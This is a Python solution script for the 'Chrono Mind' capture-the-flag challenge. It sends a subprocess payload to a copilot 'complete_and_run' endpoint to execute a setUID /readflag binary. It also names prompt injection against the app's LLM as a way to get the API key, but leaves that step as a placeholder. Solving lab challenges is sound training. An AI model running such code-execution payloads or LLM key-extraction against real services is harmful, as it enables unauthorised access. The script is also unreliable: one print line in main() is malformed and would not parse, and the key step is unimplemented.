#!/usr/bin/env python3
"""
Chrono Mind CTF Challenge - Solution Script

This script exploits the code execution vulnerability in the Copilot API endpoint
to read the flag using the setUID /readflag binary.

Target: http://target:1337
Category: Misc / Web
Vulnerability: Arbitrary code execution via AI-assisted code completion

Author: CTF Team
Date: 2025
"""

import requests
import json
import sys

# Configuration
TARGET_HOST = "localhost"  # Change to actual target
TARGET_PORT = 1337
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

# Colors for output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    """Print solution banner"""
    print("=" * 60)
    print(f"{Colors.HEADER}Chrono Mind CTF Challenge - Exploit{Colors.ENDC}")
    print("=" * 60)
    print(f"Target: {BASE_URL}")
    print(f"Vulnerability: Code Execution via Copilot API")
    print("=" * 60)
    print()

def discover_copilot_key():
    """
    Step 1: Discover the copilot API key
    
    This function should implement techniques to discover the secret key:
    - LLM prompt injection
    - Information leakage analysis
    - Configuration file access
    
    Returns:
        str: The discovered API key or None
    """
    print(f"{Colors.OKBLUE}[*] Step 1: Attempting to discover copilot API key...{Colors.ENDC}")
    
    # TODO: Implement key discovery logic
    # Possible approaches:
    # 1. Try prompt injection on the /api/ask endpoint
    # 2. Analyze application responses for leaks
    # 3. Test common/default keys
    
    # Placeholder - this would need to be discovered during the CTF
    discovered_key = "REDACTED_SECRET"  # Replace with actual discovery method
    
    print(f"{Colors.WARNING}[!] Key discovery not fully implemented{Colors.ENDC}")
    print(f"{Colors.WARNING}[!] Using placeholder key: {discovered_key}{Colors.ENDC}")
    
    return discovered_key

def exploit_code_execution(api_key):
    """
    Step 2: Exploit code execution vulnerability
    
    Args:
        api_key (str): The copilot API key
        
    Returns:
        str: The flag or None on failure
    """
    print(f"\n{Colors.OKBLUE}[*] Step 2: Exploiting code execution vulnerability...{Colors.ENDC}")
    
    # Payload to execute /readflag
    exploit_code = """
import subprocess
result = subprocess.run(['/readflag'], capture_output=True, text=True)
print(result.stdout.strip())
"""
    
    payload = {
        "code": exploit_code.strip(),
        "copilot_key": api_key
    }
    
    try:
        print(f"{Colors.OKCYAN}[*] Sending exploit payload...{Colors.ENDC}")
        response = requests.post(
            f"{BASE_URL}/api/copilot/complete_and_run",
            json=payload,
            timeout=15
        )
        
        print(f"{Colors.OKCYAN}[*] Response Status: {response.status_code}{Colors.ENDC}")
        
        if response.status_code == 200:
            data = response.json()
            print(f"{Colors.OKCYAN}[*] Response Data: {data}{Colors.ENDC}")
            
            # Extract result from response
            if 'result' in data:
                flag = data['result']
                if flag and 'HTB{' in flag:
                    return flag
                else:
                    print(f"{Colors.WARNING}[!] Result doesn't contain flag: {flag}{Colors.ENDC}")
            
            # Try 'completion' field as alternative
            if 'completion' in data:
                print(f"{Colors.OKBLUE}[*] Completion: {data['completion']}{Colors.ENDC}")
                
        elif response.status_code == 403:
            print(f"{Colors.FAIL}[!] Access Denied - Invalid API key{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[!] Unexpected response: {response.text}{Colors.ENDC}")
            
    except requests.exceptions.RequestException as e:
        print(f"{Colors.FAIL}[!] Request failed: {e}{Colors.ENDC}")
        
    return None

def main():
    """Main exploitation flow"""
    print_banner()
    
    # Step 1: Discover API key
    api_key = discover_copilot_key()
    
    if not api_key:
        print(f"{Colors.FAIL}[!] Failed to discover API key{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] You may need to manually discover the key through:"){Colors.ENDC}")
        print(f"    - LLM prompt injection")
        print(f"    - Application source code analysis")
        print(f"    - Configuration file access")
        sys.exit(1)
    
    # Step 2: Exploit code execution
    flag = exploit_code_execution(api_key)
    
    if flag:
        print()
        print("=" * 60)
        print(f"{Colors.OKGREEN}{Colors.BOLD}[+] SUCCESS! Flag captured:{Colors.ENDC}")
        print(f"{Colors.OKGREEN}{Colors.BOLD}[+] {flag}{Colors.ENDC}")
        print("=" * 60)
        return 0
    else:
        print()
        print(f"{Colors.FAIL}[!] Exploitation failed - Flag not retrieved{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Check the target URL and API key{Colors.ENDC}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
